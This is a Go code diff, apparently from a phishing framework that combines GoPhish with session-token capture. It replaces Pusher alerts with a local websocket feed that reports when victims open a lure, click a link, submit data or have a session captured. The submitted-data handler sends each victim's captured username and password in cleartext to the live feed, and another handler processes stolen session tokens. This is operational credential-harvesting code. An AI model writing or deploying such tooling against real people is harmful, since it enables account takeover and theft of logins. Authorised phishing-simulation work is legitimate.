@@ -6,7 +6,7 @@ import (
 
     "github.com/tidwall/buntdb"
 
-    pusher "github.com/pusher/pusher-http-go/v5"
+    "github.com/gorilla/websocket"
     "net/url"
     "fmt"
     "time"
@@ -62,14 +62,10 @@ type EventError struct {
     Error string `json:"error"`
 }
 
-type Pusher struct {
-    AppID          string  `json:"pusher_app_id"`
-    AppKey         string  `json:"pusher_app_key"`
-    Secret         string  `json:"pusher_app_secret"`
-    Cluster        string  `json:"pusher_app_cluster"`
-    EncryptKey     string  `json:"pusher_encrypt_key"`
-    ChannelName    string  `json:"pusher_channel_name"`
-    Enabled        bool    `json:"enable_pusher"`
+type FeedEvent struct {
+    Event 	string `json:"event"`
+    Time 	string `json:"time"`
+    Message string `json:"message"`
 }
 
 func SetupGPDB(path string) error {
@@ -152,7 +148,7 @@ func (r *Result) createEvent(status string, details interface{}) (*Event, error)
     return e, nil
 }
 
-func HandleEmailOpened (rid string, browser map[string]string, client Pusher) error {
+func HandleEmailOpened (rid string, browser map[string]string, feed_enabled bool) error {
     r := Result{}
     query := gp_db.Table("results").Where("r_id=?", rid)
     err := query.Scan(&r).Error
@@ -172,11 +168,17 @@ func HandleEmailOpened (rid string, browser map[string]string, client Pusher) er
         res.Longitude = 0.000000
         res.Reported = false
         res.BaseRecipient = r.BaseRecipient
-        if client.Enabled {
+        if feed_enabled {
             if r.SMSTarget {
-                r.PusherNotifySMSOpened(client)
+                err = r.NotifySMSOpened()
+                if err != nil {
+                    fmt.Printf("Error sending websocket message: %s\n", err)
+                }
             } else {
-                r.PusherNotifyEmailOpened(client)
+                err = r.NotifyEmailOpened()
+                if err != nil {
+                    fmt.Printf("Error sending websocket message: %s\n", err)
+                }
             }
         }
         event, err := res.createEvent("Email/SMS Opened", ed)
@@ -192,7 +194,7 @@ func HandleEmailOpened (rid string, browser map[string]string, client Pusher) er
     }
 }
 
-func HandleClickedLink (rid string, browser map[string]string, client Pusher) error {
+func HandleClickedLink (rid string, browser map[string]string, feed_enabled bool) error {
     r := Result{}
     query := gp_db.Table("results").Where("r_id=?", rid)
     err := query.Scan(&r).Error
@@ -216,12 +218,24 @@ func HandleClickedLink (rid string, browser map[string]string, client Pusher) er
         if err != nil {
             return err
         }
-        if r.Status == "Email/SMS Sent" {
-            HandleEmailOpened(rid, browser, client)
-        }
-        if client.Enabled {
-            r.PusherNotifyClickedLink(client)
-        }
+        if feed_enabled {
+            if r.Status == "Email/SMS Sent" {
+                HandleEmailOpened(rid, browser, true)
+                err = r.NotifyClickedLink()
+                if err != nil {
+                    fmt.Printf("Error sending websocket message: %s\n", err)
+                }
+            } else {
+                err = r.NotifyClickedLink()
+                if err != nil {
+                    fmt.Printf("Error sending websocket message: %s\n", err)
+                }
+            }
+        } else {
+            if r.Status == "Email/SMS Sent" {
+                HandleEmailOpened(rid, browser, false)
+            }
+        }   
         if r.Status == "Submitted Data" {
             return nil
         }
@@ -231,7 +245,7 @@ func HandleClickedLink (rid string, browser map[string]string, client Pusher) er
     }
 }
 
-func HandleSubmittedData (rid string, username string, password string, browser map[string]string, client Pusher) error {
+func HandleSubmittedData (rid string, username string, password string, browser map[string]string, feed_enabled bool) error {
     r := Result{}
     query := gp_db.Table("results").Where("r_id=?", rid)
     err := query.Scan(&r).Error
@@ -251,8 +265,11 @@ func HandleSubmittedData (rid string, username string, password string, browser 
         res.Longitude = 0.000000
         res.Reported = false
         res.BaseRecipient = r.BaseRecipient
-        if client.Enabled {
-            r.PusherNotifySubmittedData(client, username, password)
+        if feed_enabled {
+            err = r.NotifySubmittedData(username, password)
+            if err != nil {
+                fmt.Printf("Error sending websocket message: %s\n", err)
+            }
         }
         event, err := res.createEvent("Submitted Data", ed)
         if err != nil {
@@ -267,7 +284,7 @@ func HandleSubmittedData (rid string, username string, password string, browser 
     }
 }
 
-func HandleCapturedSession (rid string, tokens map[string]map[string]*Token, browser map[string]string, client Pusher) error {
+func HandleCapturedSession (rid string, tokens map[string]map[string]*Token, browser map[string]string, feed_enabled bool) error {
     r := Result{}
     query := gp_db.Table("results").Where("r_id=?", rid)
     err := query.Scan(&r).Error
@@ -288,8 +305,11 @@ func HandleCapturedSession (rid string, tokens map[string]map[string]*Token, bro
         res.Longitude = 0.000000
         res.Reported = false
         res.BaseRecipient = r.BaseRecipient
-        if client.Enabled {
-            r.PusherNotifyCapturedSession(client)
+        if feed_enabled {
+            err = r.NotifyCapturedSession()
+            if err != nil {
+                fmt.Printf("Error sending websocket message: %s\n", err)
+            }
         }
         event, err := res.createEvent("Captured Session", ed)
         if err != nil {
@@ -301,79 +321,104 @@ func HandleCapturedSession (rid string, tokens map[string]map[string]*Token, bro
     }
 }
 
-func (r *Result) PusherNotifyEmailOpened(client Pusher) {
-    pusherClient := pusher.Client{
-        AppID: client.AppID,
-        Key: client.AppKey,
-        Secret: client.Secret,
-        Cluster: client.Cluster,
-        EncryptionMasterKeyBase64: client.EncryptKey,
-    }
-    data := map[string]string{"event": "Email Opened", "time": r.ModifiedDate.String(), "message": "Email has been opened by victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(client.ChannelName, "event", data)
+func (r *Result) NotifyEmailOpened() error {
+    c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
     if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+        return err
     }
+    defer c.Close()
+
+    fe := FeedEvent{}
+    fe.Event = "Email Opened"
+    fe.Message = "Email has been opened by victim: <strong>" + r.Email + "</strong>"
+    fe.Time = r.ModifiedDate.String()
+    data, _ := json.Marshal(fe)
+
+    err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+    if err != nil {
+        return err
+    }
+    return err
 }
 
-func (r *Result) PusherNotifySMSOpened(client Pusher) {
-    pusherClient := pusher.Client{
-        AppID: client.AppID,
-        Key: client.AppKey,
-        Secret: client.Secret,
-        Cluster: client.Cluster,
-        EncryptionMasterKeyBase64: client.EncryptKey,
-    }
-    data := map[string]string{"event": "SMS Opened", "time": r.ModifiedDate.String(), "message": "SMS has been opened by victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(client.ChannelName, "event", data)
+func (r *Result) NotifySMSOpened() error {
+    c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
     if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+        return err
     }
+    defer c.Close()
+
+    fe := FeedEvent{}
+    fe.Event = "SMS Opened"
+    fe.Message = "SMS has been opened by victim: <strong>" + r.Email + "</strong>"
+    fe.Time = r.ModifiedDate.String()
+    data, _ := json.Marshal(fe)
+
+    err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+    if err != nil {
+        return err
+    }
+    return err
 }
 
-func (r *Result) PusherNotifyClickedLink(client Pusher) {
-    pusherClient := pusher.Client{
-        AppID: client.AppID,
-        Key: client.AppKey,
-        Secret: client.Secret,
-        Cluster: client.Cluster,
-        EncryptionMasterKeyBase64: client.EncryptKey,
-    }
-    data := map[string]string{"event": "Clicked Link", "time": r.ModifiedDate.String(), "message": "Link has been clicked by victim: <strong>" + r.Email + "</strong>"}
-    err := pusherClient.Trigger(client.ChannelName, "event", data)
+func (r *Result) NotifyClickedLink() error {
+    c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
     if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+        return err
     }
+    defer c.Close()
+
+    fe := FeedEvent{}
+    fe.Event = "Clicked Link"
+    fe.Message = "Link has been clicked by victim: <strong>" + r.Email + "</strong>"
+    fe.Time = r.ModifiedDate.String()
+    data, _ := json.Marshal(fe)
+
+    err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+    if err != nil {
+        return err
+    }
+    return err
 }
 
-func (r *Result) PusherNotifySubmittedData(client Pusher, username string, password string) {
-    pusherClient := pusher.Client{
-        AppID: client.AppID,
-        Key: client.AppKey,
-        Secret: client.Secret,
-        Cluster: client.Cluster,
-        EncryptionMasterKeyBase64: client.EncryptKey,
-    }
-    data := map[string]string{"event": "Submitted Data", "time": r.ModifiedDate.String(), "message": "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password}
-    err := pusherClient.Trigger(client.ChannelName, "event", data)
+func (r *Result) NotifySubmittedData(username string, password string) error {
+    c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
     if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+        return err
     }
+    defer c.Close()
+
+    fe := FeedEvent{}
+    fe.Event = "Submitted Data"
+    fe.Message = "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password
+    fe.Time = r.ModifiedDate.String()
+    data, _ := json.Marshal(fe)
+
+    err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+    if err != nil {
+        return err
+    }
+    return err
 }
 
-func (r *Result) PusherNotifyCapturedSession(client Pusher) {
-    pusherClient := pusher.Client{
-        AppID: client.AppID,
-        Key: client.AppKey,
-        Secret: client.Secret,
-        Cluster: client.Cluster,
-        EncryptionMasterKeyBase64: client.EncryptKey,
-    }
-    data := map[string]string{"event": "Captured Session", "time": r.ModifiedDate.String(), "message": "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON in GoPhish dashboard!"}
-    err := pusherClient.Trigger(client.ChannelName, "event", data)
+func (r *Result) NotifyCapturedSession() error {
+    c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
     if err != nil {
-        fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
+        return err
     }
+    defer c.Close()
+
+    fe := FeedEvent{}
+    fe.Event = "Captured Session"
+    fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON in GoPhish dashboard!"
+    fe.Time = r.ModifiedDate.String()
+    data, _ := json.Marshal(fe)
+
+    err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
+    if err != nil {
+        return err
+    }
+    return err
 }
 
 func NewDatabase(path string) (*Database, error) {
